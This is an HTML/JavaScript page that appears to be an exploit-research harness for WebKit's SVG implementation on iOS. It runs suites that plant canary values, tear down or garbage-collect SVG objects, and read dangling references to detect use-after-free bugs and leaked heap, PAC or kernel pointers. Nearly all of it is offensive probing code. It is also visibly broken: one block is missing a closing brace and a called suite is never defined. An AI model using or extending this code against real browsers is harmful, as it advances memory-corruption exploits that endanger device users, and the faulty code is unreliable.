<body>
<h1>▓ SVG v37 — SHADOW/USE/INTERSECT/ANIMREF</h1>
<h2>use-element shadow teardown · getIntersectionList dangling · animVal frame ref · consolidate mid-anim · iOS 26.5.2 / A16 arm64e</h2>

<div class="suite">
<button id="btn-all" onclick="runAll()">★ RUN ALL</button>
<button onclick="go('SH')">SH</button>
<button onclick="go('IL')">IL</button>
<button onclick="go('AR')">AR</button>
<button onclick="go('CM')">CM</button>
<button onclick="go('WR')">WR</button>
<button onclick="go('SU')">SU</button>
<button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
<button onclick="clearOut()">✕</button>
</div>
<div class="suite"><div id="progress"></div><div id="out"></div></div>

<script>
var NS='http://www.w3.org/2000/svg';
var XLINK='http://www.w3.org/1999/xlink';

var _fb=new ArrayBuffer(8);
var _dv=new Float64Array(_fb);
var _uv=new Uint32Array(_fb);
function f64hex(f){
  if(f===null||f===undefined)return'null';
  if(typeof f==='string')return f;
  _dv[0]=f;
  return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');
}
function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}
function f64hi(f){_dv[0]=f;return _uv[1];}

function classifyPtr(v){
  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return null;
  _dv[0]=v; var hi=_uv[1]; var lo=_uv[0];
  if(hi===0x00000001)return{type:'arm64_user',hi:hi,lo:lo};
  if(hi>=0x00000002&&hi<=0x0000ffff&&lo>0x1000)return{type:'native_heap',hi:hi,lo:lo};
  if(hi>=0x00010000&&hi<=0x0001ffff)return{type:'jsc_cell',hi:hi,lo:lo};
  if(hi>=0x00100000&&hi<=0x001fffff)return{type:'pac_ptr',hi:hi,lo:lo};
  if(hi>=0xffff0000)return{type:'kernel',hi:hi,lo:lo};
  return null;
}
function isWeird(v){
  if(v===null||v===undefined||isNaN(v)||!isFinite(v))return false;
  if(v===0||v===1||v===-1)return false;
  _dv[0]=v; var hi=_uv[1];
  if((hi&0xFFF00000)===0x40000000)return false; // 2.0–3.99
  if((hi&0xFFF00000)===0x40100000)return false; // 4.0–7.99
  if((hi&0xFFF00000)===0x40200000)return false; // 8.0–15.99
  if((hi&0xFF000000)===0x40000000)return false; // 2–64 clean range
  if((hi&0xFF000000)===0x3F000000)return false; // 0.5–1 clean
  return true;
}

function log(m,c){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(c||'info');
  e.textContent=m;
  d.appendChild(e);
  e.scrollIntoView({block:'nearest'});
}
function prog(m){document.getElementById('progress').textContent=m;}
function hdr(m){log(m,'hdr');}
function clearOut(){document.getElementById('out').innerHTML='';prog('');}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}
function go(s){clearOut();window['run'+s]();}
function runAll(){
  clearOut();
  runSH();
  setTimeout(function(){runIL();},2000);
  setTimeout(function(){runAR();},4500);
  setTimeout(function(){runCM();},7500);
  setTimeout(function(){runWR();},10000);
  setTimeout(function(){runSU();},12000);
}

function mkSVG(w,h,vb){
  var s=document.createElementNS(NS,'svg');
  s.setAttribute('width',w||300);s.setAttribute('height',h||300);
  if(vb)s.setAttribute('viewBox',vb);
  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||300)+'px;height:'+(h||300)+'px;opacity:0.001;pointer-events:none';
  document.body.appendChild(s);return s;
}
function mkEl(p,tag,attrs){
  var e=document.createElementNS(NS,tag);
  if(attrs)Object.keys(attrs).forEach(function(k){
    if(k==='xhref')e.setAttributeNS(XLINK,'href',attrs[k]);
    else e.setAttribute(k,attrs[k]);
  });
  p.appendChild(e);return e;
}
function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}
function bcr(el){try{return el.getBoundingClientRect();}catch(e){return null;}}

// ════════════════════════════════════════════════════════════════════════
// SH — SVGUseElement shadow tree teardown
// <use> clones the referenced element into a shadow tree
// get refs to shadow tree matrices → detach <use> → read dangling refs
// if shadow tree is torn down but JS refs survive: UAF
// ════════════════════════════════════════════════════════════════════════
function runSH(){
  hdr('SH: SVGUseElement shadow tree teardown UAF');
  var svg=mkSVG(300,300);
  var defs=mkEl(svg,'defs');

  // create source element with known matrix
  var src=mkEl(defs,'rect',{id:'src1',x:'10',y:'10',width:'50',height:'50'});
  src.setAttribute('transform','matrix(1 0 0 1 0 0)');
  var srcMX=src.transform.baseVal.getItem(0).matrix;
  srcMX.e=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
  srcMX.f=fromHiLo(0xBBBBBBBB,0xBBBBBBBB);

  // create <use> element referencing src
  var useEl=mkEl(svg,'use',{xhref:'#src1',x:'0',y:'0'});

  // SH[1]: read shadow root element's CTM — does it expose shadow matrix?
  hdr('SH[1]: use element CTM vs source CTM');
  var useCTM=ctm(useEl);
  var srcCTM=ctm(src);
  log('SH[1]: use CTM.e='+(useCTM?f64hex(useCTM.e):'null')+
    ' src CTM.e='+(srcCTM?f64hex(srcCTM.e):'null'),'info');

  // SH[2]: try to get the shadow element directly
  // In older WebKit, shadowRoot may be accessible
  hdr('SH[2]: shadow root access attempt');
  var shadow=null;
  try{shadow=useEl.shadowRoot;}catch(e){log('SH[2]: shadowRoot threw: '+e,'warn');}
  log('SH[2]: shadowRoot='+shadow,'info');

  // SH[3]: getScreenCTM on use element's instance tree
  // SVGUseElement.instanceRoot / animatedInstanceRoot
  hdr('SH[3]: instanceRoot access');
  var instRoot=null;
  try{instRoot=useEl.instanceRoot||useEl.animatedInstanceRoot;}catch(e){}
  log('SH[3]: instanceRoot='+instRoot,'info');
  if(instRoot){
    // instanceRoot is SVGElementInstance — read its transform
    try{
      var instEl=instRoot.correspondingElement;
      if(instEl){
        var instCTM=ctm(instEl);
        log('SH[3]: instance element CTM.e='+(instCTM?f64hex(instCTM.e):'null'),'info');
        // get matrix from instance element
        if(instEl.transform&&instEl.transform.baseVal.numberOfItems>0){
          var instMX=instEl.transform.baseVal.getItem(0).matrix;
          log('SH[3]: instance matrix.e='+f64hex(instMX.e)+
            ' matches src canary='+(instMX.e===srcMX.e),
            instMX.e===srcMX.e?'star — instance matrix IS src matrix (shared backing!)':'info');
          // keep ref to instance matrix
          var savedInstMX=instMX;
          // now detach the use element
          useEl.remove();
          // read saved ref after detach
          var afterDetach=null;
          try{afterDetach=savedInstMX.e;}catch(e){afterDetach='THROWS';}
          log('SH[3]: after use.remove() — saved instMX.e='+f64hex(afterDetach),
            typeof afterDetach==='number'&&afterDetach!==srcMX.e?
            'uaf — INSTANCE MATRIX CHANGED AFTER USE REMOVAL: UAF!':
            typeof afterDetach==='number'&&afterDetach===srcMX.e?
            'star — canary survives use.remove()':
            'info — '+afterDetach);
        }
      }
    }catch(e){log('SH[3]: instance access threw: '+e,'warn');}
  }

  // SH[4]: multiple use elements sharing one source — cascade teardown
  hdr('SH[4]: cascade teardown — multi-use shared source');
  var src2=mkEl(defs,'rect',{id:'src2',x:'0',y:'0',width:'20',height:'20'});
  src2.setAttribute('transform','matrix(1 0 0 1 0 0)');
  var canary2=fromHiLo(0xDEAD0002,0xBEEF0002);
  src2.transform.baseVal.getItem(0).matrix.e=canary2;

  var uses=[];
  for(var i=0;i<10;i++){
    var u=mkEl(svg,'use',{xhref:'#src2',x:''+i*25,y:'0'});
    uses.push(u);
  }

  // get CTMs from all use elements before removal
  var preCTMs=uses.map(function(u){return ctm(u);});

  // remove source from defs while uses are still present
  src2.remove();

  // try to read CTMs after source removal
  var changedCount=0;
  uses.forEach(function(u,i){
    var postCTM=ctm(u);
    var pre=preCTMs[i];
    if(postCTM&&pre){
      var diff=Math.abs(postCTM.e-pre.e);
      if(diff>0.001){
        changedCount++;
        var p=classifyPtr(postCTM.e);
        log('SH[4]: use['+i+'] CTM.e changed: before='+f64hex(pre.e)+' after='+f64hex(postCTM.e),
          p?'ptr — POINTER IN CTM AFTER SOURCE REMOVAL!':'crit — VALUE CHANGED: '+f64hex(postCTM.e));
      }
    }
  });
  log('SH[4]: '+changedCount+'/'+uses.length+' use CTMs changed after src.remove()',
    changedCount>0?'crit — USE CTMS CHANGED AFTER SOURCE REMOVED!':'info');

  svg.remove();
  prog('SH done');
}

// ════════════════════════════════════════════════════════════════════════
// IL — getIntersectionList / getEnclosureList dangling ref
// these return a live SVGNodeList
// get the list → mutate DOM → read list items → dangling?
// ════════════════════════════════════════════════════════════════════════
function runIL(){
  hdr('IL: getIntersectionList/getEnclosureList dangling ref probe');
  var svg=mkSVG(300,300);
  svg.style.cssText='position:fixed;left:0;top:0;width:300px;height:300px;opacity:0.5;pointer-events:none';

  // create several rects in the intersection zone
  var rects=[];
  for(var i=0;i<8;i++){
    var r=mkEl(svg,'rect',{
      x:''+(i*20), y:'0', width:'50',height:'50',fill:'red'
    });
    r.setAttribute('transform','matrix(1 0 0 1 0 0)');
    r.transform.baseVal.getItem(0).matrix.e=fromHiLo(0xDEAD0000+i,0xBEEF0000+i);
    rects.push(r);
  }

  // IL[1]: getIntersectionList
  hdr('IL[1]: getIntersectionList — get list then remove elements');
  var intersectRect=svg.createSVGRect();
  intersectRect.x=0; intersectRect.y=0;
  intersectRect.width=300; intersectRect.height=300;

  var nodeList=null;
  try{nodeList=svg.getIntersectionList(intersectRect,null);}catch(e){
    log('IL[1]: getIntersectionList threw: '+e,'warn');
  }

  if(nodeList){
    log('IL[1]: initial list length='+nodeList.length,'info');
    // save refs to items
    var savedItems=[];
    for(var i=0;i<nodeList.length;i++){
      savedItems.push(nodeList.item(i));
    }

    // read transforms before removal
    var preMXs=savedItems.map(function(el){
      if(!el||!el.transform||el.transform.baseVal.numberOfItems===0)return null;
      return el.transform.baseVal.getItem(0).matrix.e;
    });

    // now remove all rects from DOM
    rects.forEach(function(r){r.remove();});

    // force GC pressure
    var p=[];for(var i=0;i<1000;i++)p.push(new Float64Array(512));p=null;

    // read saved item refs after removal
    hdr('IL[1]: reading saved items after DOM removal');
    var changedCount=0;
    savedItems.forEach(function(el,i){
      var postE=null;
      try{
        if(el&&el.transform&&el.transform.baseVal.numberOfItems>0){
          postE=el.transform.baseVal.getItem(0).matrix.e;
        }
      }catch(e){postE='THROWS: '+e.name;}
      var pre=preMXs[i];
      if(postE!==pre){
        changedCount++;
        var p2=classifyPtr(typeof postE==='number'?postE:null);
        log('IL[1]: savedItem['+i+'] changed: pre='+f64hex(pre)+' post='+f64hex(postE),
          p2?'ptr — POINTER IN DETACHED NODE LIST ITEM! type='+p2.type:
          'uaf — VALUE CHANGED AFTER REMOVAL: '+f64hex(postE));
      }
    });
    log('IL[1]: '+changedCount+'/'+savedItems.length+' items changed after removal',
      changedCount>0?'uaf — NODELIST UAF DETECTED!':'info — all stable');

    // IL[2]: read the nodeList itself after mutations
    hdr('IL[2]: nodeList.length after DOM mutations');
    try{
      log('IL[2]: nodeList.length after removal='+nodeList.length,
        'info — list updated: '+nodeList.length);
    }catch(e){log('IL[2]: nodeList.length threw: '+e,'warn');}
  }

  // IL[3]: getEnclosureList — slightly different query
  hdr('IL[3]: getEnclosureList dangling ref');
  var rects3=[];
  for(var i=0;i<5;i++){
    var r3=mkEl(svg,'rect',{x:''+(i*10),y:'0',width:'10',height:'10',fill:'blue'});
    r3.setAttribute('transform','matrix(1 0 0 1 0 0)');
    r3.transform.baseVal.getItem(0).matrix.e=fromHiLo(0xC0FFEE00+i,0xC0FFEE00+i);
    rects3.push(r3);
  }

  var eList=null;
  try{eList=svg.getEnclosureList(intersectRect,null);}catch(e){}
  if(eList&&eList.length>0){
    var eItem=eList.item(0);
    var preMX=null;
    try{preMX=eItem.transform.baseVal.getItem(0).matrix.e;}catch(e){}
    log('IL[3]: enclosure list length='+eList.length+' item[0].mx.e='+f64hex(preMX),'info');

    // remove all rects
    rects3.forEach(function(r){r.remove();});
    var p3=[];for(var i=0;i<1000;i++)p3.push(new Float64Array(512));p3=null;

    var postMX=null;
    try{postMX=eItem.transform.baseVal.getItem(0).matrix.e;}catch(e){postMX='THROWS';}
    log('IL[3]: after enclosure elements removed: item[0].mx.e='+f64hex(postMX),
      postMX!==preMX?'uaf — ENCLOSURE LIST UAF!':'info — stable');
  }

  svg.remove();
  prog('IL done');
}

// ════════════════════════════════════════════════════════════════════════
// AR — animVal frame ref: get transform from animVal during one rAF frame
// save the specific SVGTransform object from animVal.getItem(0)
// on NEXT frame, the animation advances — does the saved ref
// point to the previous frame's (now stale) matrix?
// ════════════════════════════════════════════════════════════════════════
function runAR(){
  hdr('AR: animVal frame-ref stale read');
  var svg=mkSVG(200,200);
  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'red'});
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');

  // start SMIL animation
  var anim=mkEl(r,'animateTransform',{
    attributeName:'transform',
    type:'translate',
    from:'0 0',
    to:'500 0',
    dur:'0.5s',
    repeatCount:'indefinite'
  });

  // AR[1]: capture animVal transform ref across frames
  hdr('AR[1]: animVal transform object identity across frames');
  var frameRefs=[];
  var frameVals=[];
  var frameCount=0;
  var startT=performance.now();

  function captureFrame(){
    var elapsed=performance.now()-startT;
    if(elapsed>800){
      // analyze captured refs
      prog('AR[1]: analyzing '+frameRefs.length+' captured refs');
      hdr('AR[1]: cross-frame ref analysis');

      // read all saved refs NOW (after animation has advanced)
      var changedCount=0;
      var ptrCount=0;
      frameRefs.forEach(function(ref,i){
        var nowVal=null;
        try{nowVal=ref.matrix.e;}catch(e){nowVal='THROWS';}
        var atCapture=frameVals[i];
        if(nowVal!==atCapture){
          changedCount++;
          var p=classifyPtr(typeof nowVal==='number'?nowVal:null);
          if(p){
            ptrCount++;
            log('AR[1]: frame['+i+'] REF CHANGED+POINTER! capture='+f64hex(atCapture)+' now='+f64hex(nowVal)+' type='+p.type,
              'aslr — ANIMVAL FRAME REF LEAKED POINTER! type='+p.type);
          } else {
            log('AR[1]: frame['+i+'] changed: capture='+atCapture.toFixed(4)+' now='+(typeof nowVal==='number'?nowVal.toFixed(4):nowVal),
              'star — REF CHANGED: stale backing value');
          }
        }
      });
      log('AR[1]: '+changedCount+'/'+frameRefs.length+' refs changed, '+ptrCount+' ptrs',
        ptrCount>0?'aslr — FRAME REF POINTER LEAK!':
        changedCount>0?'star — REFS ARE STALE: animation machinery freed old frames':
        'info — all refs stable (animation updates same object)');

      // AR[2]: object identity check across frames
      hdr('AR[2]: are animVal transform objects the same across frames?');
      if(frameRefs.length>=2){
        var allSame=frameRefs.every(function(r){return r===frameRefs[0];});
        log('AR[2]: all '+frameRefs.length+' captured animVal tx objects same='+allSame,
          !allSame?'star — DIFFERENT OBJECTS ACROSS FRAMES: new allocation each frame!':
          'info — same object across frames (animation updates in place)');
        if(!allSame){
          // find first pair that differs
          for(var i=1;i<frameRefs.length;i++){
            if(frameRefs[i]!==frameRefs[0]){
              log('AR[2]: frame[0]!==frame['+i+']: new SVGTransform objects allocated per frame!','star');
              break;
            }
          }
        }
      }

      anim.remove();
      svg.remove();
      prog('AR done');
      return;
    }

    // capture this frame's animVal transform object
    try{
      var avList=r.transform.animVal;
      if(avList.numberOfItems>0){
        var tx=avList.getItem(0);
        frameRefs.push(tx);
        frameVals.push(tx.matrix.e);
        frameCount++;
      }
    }catch(e){}
    requestAnimationFrame(captureFrame);
  }

  setTimeout(function(){requestAnimationFrame(captureFrame);},50);
}

// ════════════════════════════════════════════════════════════════════════
// CM — consolidate() mid-animation
// during active SMIL animation, call consolidate() on the baseVal list
// this may cause a mismatch between animVal (animation machinery's list)
// and baseVal (the consolidated single transform)
// ════════════════════════════════════════════════════════════════════════
function runCM(){
  hdr('CM: consolidate() mid-animation state probe');
  var svg=mkSVG(200,200);

  // create element with multi-step transform
  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'green'});
  r.setAttribute('transform','translate(10,20) rotate(45) scale(2)');

  // start animation on this element
  var anim=mkEl(r,'animateTransform',{
    attributeName:'transform',
    type:'translate',
    from:'0 0',
    to:'100 0',
    dur:'1s',
    additive:'sum',
    repeatCount:'indefinite'
  });

  // CM[1]: read animVal BEFORE consolidate
  hdr('CM[1]: state before consolidate during animation');
  var preBV_n=r.transform.baseVal.numberOfItems;
  var preAV_n=r.transform.animVal.numberOfItems;
  log('CM[1]: before consolidate: baseVal.n='+preBV_n+' animVal.n='+preAV_n,'info');

  // save animVal transform refs
  var avRefs=[];
  for(var i=0;i<preAV_n;i++){
    try{avRefs.push(r.transform.animVal.getItem(i));}catch(e){}
  }

  // read their values now
  var preVals=avRefs.map(function(ref){
    try{return{e:ref.matrix.e,f:ref.matrix.f};}catch(e){return null;}
  });

  // CM[2]: consolidate baseVal mid-animation
  hdr('CM[2]: consolidate() on baseVal during active animation');
  try{r.transform.baseVal.consolidate();}catch(e){
    log('CM[2]: consolidate threw: '+e,'warn');
  }

  var postBV_n=r.transform.baseVal.numberOfItems;
  var postAV_n=r.transform.animVal.numberOfItems;
  log('CM[2]: after consolidate: baseVal.n='+postBV_n+' animVal.n='+postAV_n,
    postAV_n!==preAV_n?'star — ANIMVAL COUNT CHANGED AFTER CONSOLIDATE: '+preAV_n+'→'+postAV_n:
    'info — animVal count unchanged');

  // CM[3]: read old animVal refs after consolidate
  hdr('CM[3]: stale animVal refs after consolidate');
  var changedCount=0;
  avRefs.forEach(function(ref,i){
    if(!preVals[i])return;
    var nowE=null;
    try{nowE=ref.matrix.e;}catch(e){nowE='THROWS: '+e.name;}
    var nowF=null;
    try{nowF=ref.matrix.f;}catch(e){nowF='THROWS';}
    if(nowE!==preVals[i].e){
      changedCount++;
      var p=classifyPtr(typeof nowE==='number'?nowE:null);
      log('CM[3]: avRef['+i+'] CHANGED: before='+f64hex(preVals[i].e)+' after='+f64hex(nowE),
        p?'aslr — POINTER IN STALE ANIMVAL REF! type='+p.type:
        'crit — VALUE CHANGED AFTER CONSOLIDATE: '+f64hex(nowE));
    }
  });
  log('CM[3]: '+changedCount+'/'+avRefs.length+' animVal refs changed after consolidate',
    changedCount>0?'crit — STALE ANIMVAL DETECTED!':'info — all stable');

  // CM[4]: now read a NEW animVal item — does it reflect consolidated state?
  hdr('CM[4]: new animVal read after consolidate');
  setTimeout(function(){
    var newAV=r.transform.animVal;
    log('CM[4]: new animVal.numberOfItems='+newAV.numberOfItems,'info');
    if(newAV.numberOfItems>0){
      var newTX=newAV.getItem(0);
      log('CM[4]: new animVal[0].matrix.e='+f64hex(newTX.matrix.e)+
        ' f='+f64hex(newTX.matrix.f),'info');

    anim.remove();
    svg.remove();
    prog('CM done');
  },500);
}

// ════════════════════════════════════════════════════════════════════════
// WR — WeakRef + FinalizationRegistry UAF attempt
// JS WeakRef allows holding a ref to an object WITHOUT preventing GC
// FinalizationRegistry fires when the object is collected
// Use WeakRef to hold SVGMatrix without preventing GC
// then confirm GC happened (via registry callback) and read the WeakRef
// ════════════════════════════════════════════════════════════════════════
function runWR(){
  hdr('WR: WeakRef + FinalizationRegistry UAF');
  var svg=mkSVG(200,200);

  // WR[1]: check WeakRef availability
  hdr('WR[1]: WeakRef / FinalizationRegistry availability');
  var hasWeakRef=(typeof WeakRef!=='undefined');
  var hasRegistry=(typeof FinalizationRegistry!=='undefined');
  log('WR[1]: WeakRef='+hasWeakRef+' FinalizationRegistry='+hasRegistry,'info');

  if(!hasWeakRef){
    log('WR[1]: WeakRef unavailable — skipping WR suite','warn');
    svg.remove();
    prog('WR done (unavailable)');
    return;
  }

  // WR[2]: SVGMatrix via WeakRef — does it survive GC?
  hdr('WR[2]: SVGMatrix in WeakRef — GC survival test');
  var canary=fromHiLo(0xDEADBEEF,0xCAFEBABE);
  var gcFired=false;
  var reg=hasRegistry?new FinalizationRegistry(function(val){
    gcFired=true;
    log('WR[2]: FinalizationRegistry fired! token='+val,'crit — GC COLLECTED THE MATRIX!');
    // try to read the WeakRef NOW — object being collected
    var deref=mxWeakRef.deref();
    if(deref){
      log('WR[2]: deref AFTER GC callback: e='+f64hex(deref.e),
        'uaf — WEAKREF READABLE DURING COLLECTION: UAF WINDOW!');
    } else {
      log('WR[2]: deref returned undefined after GC (expected)','info');
    }
  }):null;

  var mxWeakRef=null;
  (function(){
    var mx=svg.createSVGMatrix();
    mx.e=canary; mx.f=canary; mx.a=canary;
    mxWeakRef=new WeakRef(mx);
    if(reg)reg.register(mx,'SVGMatrix-canary');
    // mx goes out of scope here
  })();

  // WR[3]: check deref before GC
  var prePressure=mxWeakRef.deref();
  log('WR[3]: before GC pressure: deref alive='+(prePressure!==undefined)+
    (prePressure?' e='+f64hex(prePressure.e):''),'info');

  // apply massive GC pressure
  for(var i=0;i<50;i++){
    var p=[];
    for(var j=0;j<1000;j++)p.push(new Float64Array(1024));
    p=null;
  }

  // check after pressure
  var postPressure=mxWeakRef.deref();
  log('WR[3]: after GC pressure: deref alive='+(postPressure!==undefined)+
    (postPressure?' e='+f64hex(postPressure.e):'')+'  gcFired='+gcFired,
    postPressure===undefined&&!gcFired?'star — DEREF CLEARED BUT NO GC CALLBACK: object freed!':
    postPressure===undefined&&gcFired?'info — GC collected, registry fired as expected':
    postPressure!==undefined?'info — object still alive (ARC): e='+f64hex(postPressure.e):'info');

  // WR[4]: SVGTransform WeakRef
  hdr('WR[4]: SVGTransform in WeakRef — GC survival');
  var txWeakRef=null;
  var txCanary=fromHiLo(0x12345678,0x9ABCDEF0);
  (function(){
    var tx=svg.createSVGTransform();
    tx.matrix.e=txCanary;
    txWeakRef=new WeakRef(tx);
    if(reg)reg.register(tx,'SVGTransform-canary');
  })();

  for(var i=0;i<50;i++){
    var p2=[];
    for(var j=0;j<1000;j++)p2.push(new Float64Array(1024));
    p2=null;
  }

  var txDeref=txWeakRef.deref();
  log('WR[4]: SVGTransform deref after GC: alive='+(txDeref!==undefined)+
    (txDeref?' e='+f64hex(txDeref.matrix.e):''),
    txDeref===undefined?'star — SVGTransform GC collected via WeakRef!':
    'info — still alive via ARC: e='+f64hex(txDeref.matrix.e));

  svg.remove();
  prog('WR done');
}
